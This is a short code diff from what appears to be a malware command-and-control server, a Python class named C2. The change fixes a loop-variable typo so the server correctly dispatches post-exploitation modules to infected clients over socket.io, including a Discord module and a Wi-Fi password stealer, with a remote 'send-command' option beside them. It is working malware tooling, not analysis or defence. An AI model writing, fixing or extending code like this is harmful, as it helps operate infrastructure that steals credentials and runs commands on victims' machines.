@@ -189,7 +189,7 @@ class C2:
                 self.sio.emit('pem', {"uid": uid, "url": 'client/pem/discord.py'})
 
         if explotation_module_type == "wifi-password":
-            for uud in uids:
+            for uid in uids:
                 self.sio.emit('pem', {"uid": uid, "url": 'client/pem/wifi.py'})
 
         if explotation_module_type == "send-command":
